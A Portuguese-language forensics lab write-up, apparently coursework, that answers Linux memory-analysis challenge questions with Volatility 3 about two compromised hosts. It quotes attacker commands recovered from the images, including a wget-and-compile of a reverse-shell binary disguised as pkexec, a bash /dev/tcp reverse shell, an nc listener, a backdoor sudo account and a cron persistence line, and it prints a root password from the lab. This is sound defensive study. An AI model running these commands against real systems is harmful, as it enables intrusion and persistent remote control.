# Análise Forense de Memória Linux — Volatility 3

Resolução dos desafios de **memória Linux** (Defense Operations / FIAP): um servidor de banco de dados Linux comprometido (`linux.mem`) e um host AWS com rootkit/backdoor (`FS-01.mem`). Feito com **Volatility 3** no WSL.

## Desafio técnico resolvido: tabela de símbolos (ISF)

O Volatility 3 precisa de uma tabela de símbolos (ISF) compatível com o kernel exato. Para os dois dumps:

- Identifiquei o kernel com `banners.Banners` (`5.4.0-166-generic` e `5.15.0-1066-aws`).
- Baixei os ISFs prontos do repositório comunitário **Abyss-W4tcher/volatility3-symbols**.
- Para o kernel 5.4, o plugin `linux.pagecache.InodePages` falhava com `AttributeError: page.mapping` — o `dwarf2json` perdeu campos do `struct page` por colisão de uniões anônimas. **Corrigi o JSON do ISF** adicionando manualmente os campos `lru/mapping/index/private` nos offsets corretos (script `fix_page_isf.py`), o que permitiu extrair arquivos do page cache.

---

## Caso 3 — Servidor de banco de dados Linux (`linux.mem`, Ubuntu 20.04)

| Pergunta | Resposta | Plugin |
|---|---|---|
| a) Senha de root exposta | **`Ftrccw45PHyq`** (digitada após `su root` no histórico) | `linux.bash.Bash` |
| a) Horário de acesso a `users.db` | **2023-11-07 03:42:22 UTC** | `linux.pagecache.Files` (AccessTime) |
| b) MD5 do arquivo malicioso | **`0511ccaad402d6d13ce801e1e9136ba2`** (`/home/paco/pkexecc`) | dump via `InodePages --dump` + `md5sum` |
| c) IP:porta do agente malicioso | **`10.0.2.72:1337`** | `linux.sockstat` (conexão ESTABLISHED do `sh`/`su`/`bash`) |
| d) Cronjob + inode | **`/var/spool/cron/crontabs/root:131127`** | `linux.pagecache.Files` |

**Raciocínio:** o histórico do bash mostra `wget 10.0.2.72/shell.c && gcc shell.c -o pkexecc`. A análise estática do `pkexecc` extraído revela `socket/connect/dup2/execve("/bin/sh")` para `10.0.2.72` — é um **shell reverso em C** disfarçado de `pkexec`. O cronjob de persistência (`* * * * * cp /opt/.bashrc /root/.bashrc`) foi recuperado direto do page cache.

---

## Memória Linux — Host AWS (`FS-01.mem`, Ubuntu 5.15 aws)

MD5 da imagem: `c0fbf40989bda765b8edaa41f72d3ee9`.

| Pergunta | Resposta |
|---|---|
| b) PID do Netcat suspeito | **15011** (`nc -nlvp 9898`) |
| c) Processo no /tmp oculto | **`.strokes`** (`/home/mircoservice/.tmp/.strokes`) |
| d) Porta do servidor Python | **9090** (`python3 -m http.server 9090`) |
| e) Caminho do PID 821 | **`/home/mircoservice/printer_app`** |
| f) IP do servidor remoto (Python TCP) | **10.100.1.125** (`linux.sockstat`) |
| g) IP do host infectado | **10.10.163.215** (`linux.ip.Addr`) |
| h) MAC da interface | **`02:83:88:6b:5a:1f`** (ens5) |
| i) Porta do shell reverso | **9898** (nc listener) |
| j) Conta backdoor criada | **james** (`useradd james`, `usermod -aG sudo james`) |
| k) IP do invasor (reverse shell no bash) | **10.12.14.32** (`bash -i >& /dev/tcp/10.12.14.32/4567`) |

## Estrutura

```
prints/caso3/ — banner, bash history, pstree, pagecache (users.db/pkexecc/crontab),
                sockstat (reverse shell), dump+MD5 do pkexecc, crontab de persistência
prints/fs01/  — md5/banner, psaux, PID 821, ip.Addr/ip.Link, sockstat, bash (backdoor james, reverse shell)
```
